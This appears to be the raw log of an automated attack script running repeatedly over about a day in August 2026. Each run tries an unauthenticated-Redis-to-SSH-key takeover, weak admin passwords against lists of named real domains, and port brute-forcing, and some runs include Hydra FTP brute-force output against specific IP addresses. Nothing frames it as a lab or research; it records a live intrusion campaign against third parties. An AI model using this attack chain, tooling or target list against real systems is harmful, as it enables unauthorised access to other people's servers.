=== AUTO ATTACK Sun Aug  9 19:51:00 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 19:52:36 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 20:37:17 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 20:39:00 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 20:41:19 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 20:42:49 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 21:41:04 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 21:42:36 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 21:46:42 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 21:48:16 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 22:39:06 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 22:41:02 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 22:46:14 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 22:47:48 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 22:50:28 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 22:51:59 UTC 2026 ===
=== AUTO ATTACK Sun Aug  9 23:50:57 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Sun Aug  9 23:52:32 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 00:40:17 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Mon Aug 10 00:41:55 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 00:49:44 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Mon Aug 10 00:51:11 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 01:40:39 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Mon Aug 10 01:42:07 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 01:51:16 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 163.com
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
[3] port brute
=== AUTO ATTACK END Mon Aug 10 01:52:49 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 03:19:15 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin caoxianfc.com
  admin catugbio.com
  admin cepn.cn
  admin china-casting.com
  admin chinapp.com
  admin dongchedi.com
  admin gdcq119.com
  admin gongcheng.com
  admin haitaicasting.com
  admin hanslaser.com
  admin hbvalve.com.cn
  admin henglihydraulics.com
  admin hs-plastic.net
  admin hyyb.com.cn
  admin iciba.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 03:20:55 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 03:37:41 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 5911911.com
  admin 632.cn
  admin account.tastelessly.com
  admin agence-uni.com
  admin aneeshkuniyil.com
  admin ask.zol.com.cn
  admin bowlwithseoul.com
  admin buckbokai.com
  admin cdrsjxsb.com
  admin clarkfund.org
  admin cn.spg666.com
  admin codyirrigation.com
  admin cordeiroesaraiva.com
  admin dongyuesheji.com
  admin drebrownenterprises.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 03:39:10 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 04:22:58 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 5911911.com
  admin 632.cn
  admin account.tastelessly.com
  admin agence-uni.com
  admin aneeshkuniyil.com
  admin ask.zol.com.cn
  admin bowlwithseoul.com
  admin buckbokai.com
  admin cdrsjxsb.com
  admin clarkfund.org
  admin cn.spg666.com
  admin codyirrigation.com
  admin cordeiroesaraiva.com
  admin dongyuesheji.com
  admin drebrownenterprises.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 04:24:48 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 04:38:03 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 0do.net
  admin 11ban.top
  admin 177-211-78-41.user3g.veloxzone.com
  admin 2va.thesaris.com
  admin 5911911.com
  admin account.tastelessly.com
  admin admin.thesaris.com
  admin agence-uni.com
  admin aneeshkuniyil.com
  admin ask.zol.com.cn
  admin bowlwithseoul.com
  admin buckbokai.com
  admin clarkfund.org
  admin cn.spg666.com
  admin codyirrigation.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 04:39:40 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 05:26:12 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 0do.net
  admin 11ban.top
  admin 177-211-78-41.user3g.veloxzone.com
  admin 2va.thesaris.com
  admin 5911911.com
  admin account.tastelessly.com
  admin admin.thesaris.com
  admin agence-uni.com
  admin aneeshkuniyil.com
  admin ask.zol.com.cn
  admin bowlwithseoul.com
  admin buckbokai.com
  admin clarkfund.org
  admin cn.spg666.com
  admin codyirrigation.com
[3] port brute
  brute 101.0.113.246
[*] FTP brute 101.0.113.246
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-10 05:28:08
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 3 tasks per 1 server, overall 3 tasks, 25334 login tries (l:2/p:12667), ~8445 tries per task
[DATA] attacking ftp://101.0.113.246:21/
[STATUS] 18.00 tries/min, 18 tries in 00:01h, 25316 to do in 23:27h, 3 active
[STATUS] 14.33 tries/min, 43 tries in 00:03h, 25291 to do in 29:25h, 3 active
[STATUS] 13.43 tries/min, 94 tries in 00:07h, 25240 to do in 31:20h, 3 active
The session file ./hydra.restore was written. Type "hydra -R" to resume session.
=== AUTO ATTACK END Mon Aug 10 05:43:07 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 06:31:32 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 182he.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1minutereview.org
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 218t.com
  admin 2grafik.com
  admin 2va.thesaris.com
  admin 5911911.com
[3] port brute
  brute 101.0.119.58
[*] FTP brute 101.0.119.58
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-10 06:32:35
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 3 tasks per 1 server, overall 3 tasks, 25334 login tries (l:2/p:12667), ~8445 tries per task
[DATA] attacking ftp://101.0.119.58:21/
[STATUS] 18.00 tries/min, 18 tries in 00:01h, 25316 to do in 23:27h, 3 active
=== AUTO ATTACK Mon Aug 10 06:35:39 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 0do.net
  admin 11ban.top
[STATUS] 15.00 tries/min, 45 tries in 00:03h, 25289 to do in 28:06h, 3 active
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 182he.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1minutereview.org
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 218t.com
  admin 2grafik.com
  admin 2va.thesaris.com
  admin 5911911.com
[3] port brute
  brute 101.0.119.58
[*] FTP brute 101.0.119.58
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-10 06:36:34
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 3 tasks per 1 server, overall 3 tasks, 25334 login tries (l:2/p:12667), ~8445 tries per task
[DATA] attacking ftp://101.0.119.58:21/
[STATUS] 18.00 tries/min, 18 tries in 00:01h, 25316 to do in 23:27h, 3 active
[STATUS] 14.67 tries/min, 44 tries in 00:03h, 25290 to do in 28:45h, 3 active
[STATUS] 13.57 tries/min, 95 tries in 00:07h, 25239 to do in 30:60h, 3 active
[STATUS] 13.43 tries/min, 94 tries in 00:07h, 25240 to do in 31:20h, 3 active
The session file ./hydra.restore was written. Type "hydra -R" to resume session.
=== AUTO ATTACK END Mon Aug 10 06:47:35 UTC 2026 ===
The session file ./hydra.restore was written. Type "hydra -R" to resume session.
=== AUTO ATTACK END Mon Aug 10 06:51:33 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 07:39:19 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 182he.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1minutereview.org
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 218t.com
  admin 2grafik.com
  admin 2va.thesaris.com
  admin 5911911.com
[3] port brute
  brute 1.214.210.188
[*] FTP brute 1.214.210.188
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-10 07:40:23
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 3 tasks per 1 server, overall 3 tasks, 25334 login tries (l:2/p:12667), ~8445 tries per task
[DATA] attacking ftp://1.214.210.188:21/
=== AUTO ATTACK Mon Aug 10 07:41:30 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 0do.net
[STATUS] 6.00 tries/min, 6 tries in 00:01h, 25331 to do in 70:22h, 3 active
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 182he.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1minutereview.org
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 218t.com
  admin 2grafik.com
  admin 2va.thesaris.com
  admin 5911911.com
[3] port brute
  brute 1.214.210.188
[*] FTP brute 1.214.210.188
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-10 07:42:20
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 3 tasks per 1 server, overall 3 tasks, 25334 login tries (l:2/p:12667), ~8445 tries per task
[DATA] attacking ftp://1.214.210.188:21/
[STATUS] 6.00 tries/min, 6 tries in 00:01h, 25331 to do in 70:22h, 3 active
[STATUS] 6.00 tries/min, 18 tries in 00:03h, 25323 to do in 70:21h, 3 active
[STATUS] 6.00 tries/min, 18 tries in 00:03h, 25323 to do in 70:21h, 3 active
[STATUS] 6.00 tries/min, 42 tries in 00:07h, 25299 to do in 70:17h, 3 active
[STATUS] 6.00 tries/min, 42 tries in 00:07h, 25299 to do in 70:17h, 3 active
The session file ./hydra.restore was written. Type "hydra -R" to resume session.
=== AUTO ATTACK END Mon Aug 10 07:55:23 UTC 2026 ===
The session file ./hydra.restore was written. Type "hydra -R" to resume session.
=== AUTO ATTACK END Mon Aug 10 07:57:20 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 08:38:20 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 182he.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1minutereview.org
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 218t.com
  admin 2grafik.com
  admin 2va.thesaris.com
  admin 5911911.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 08:39:22 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 08:47:41 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 182he.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1minutereview.org
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 218t.com
  admin 2grafik.com
  admin 2va.thesaris.com
  admin 5911911.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 08:48:34 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 08:48:54 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 182he.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1minutereview.org
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 218t.com
  admin 2grafik.com
  admin 2va.thesaris.com
  admin 5911911.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 08:49:42 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 09:38:54 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 182he.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1minutereview.org
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 218t.com
  admin 2grafik.com
  admin 2va.thesaris.com
  admin 5911911.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 09:39:50 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 09:48:44 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 182he.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1minutereview.org
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 218t.com
  admin 2grafik.com
  admin 2va.thesaris.com
  admin 5911911.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 09:49:37 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 10:39:02 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 182he.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1minutereview.org
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 218t.com
  admin 2grafik.com
  admin 2va.thesaris.com
  admin 5911911.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 10:39:59 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 10:49:13 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2grafik.com
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 10:49:57 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 11:38:26 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2grafik.com
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 11:39:10 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 11:46:33 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2grafik.com
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 11:47:16 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 12:39:09 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2grafik.com
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 12:40:05 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 12:49:15 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2grafik.com
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 12:50:00 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 13:40:27 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2grafik.com
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 13:41:47 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 13:48:54 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2grafik.com
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 13:49:47 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 14:40:25 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2grafik.com
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 14:41:13 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 14:50:06 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2grafik.com
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 14:50:53 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 15:39:47 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2grafik.com
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 15:40:34 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 15:49:37 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2grafik.com
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 15:50:26 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 16:37:32 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2grafik.com
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 16:38:21 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 16:49:48 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
